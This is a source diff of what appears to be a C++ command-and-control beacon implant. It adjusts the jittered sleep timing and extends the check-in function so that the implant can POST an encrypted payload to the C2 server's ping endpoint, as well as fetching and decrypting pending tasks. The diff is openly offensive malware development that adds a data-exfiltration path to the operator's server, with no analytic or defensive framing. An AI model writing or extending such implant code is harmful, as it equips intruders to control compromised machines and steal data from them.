@@ -43,7 +43,7 @@ struct C2Config {
         int variation = (sleep_ms * jitter) / 100;
         // Simple random without pulling in <random> (lighter binary)
         int offset = (rand() % (2 * variation + 1)) - variation;
-        return max(1000, sleep_ms + offset);  // Minimum 1 second
+        return std::max(1000, sleep_ms + offset);  // Minimum 1 second
     }
 };
 
@@ -222,9 +222,11 @@ inline std::string http_request(
 
 // Check in with the C2 server and retrieve pending tasks.
 // Returns the decrypted JSON string with tasks, or "" on failure.
-inline std::string checkin(const C2Config& cfg) {
+inline std::string checkin(const C2Config& cfg, const std::string& payload = "") {
+    std::wstring method = payload.empty() ? L"GET" : L"POST";
+    std::string body = payload.empty() ? "" : crypto::encrypt(payload);
     std::string encrypted_response = http_request(
-        cfg, L"GET", L"/api/v1/ping", "", cfg.beacon_id);
+        cfg, method, L"/api/v1/ping", body, cfg.beacon_id);
 
     if (encrypted_response.empty()) return "";
     return crypto::decrypt(encrypted_response);
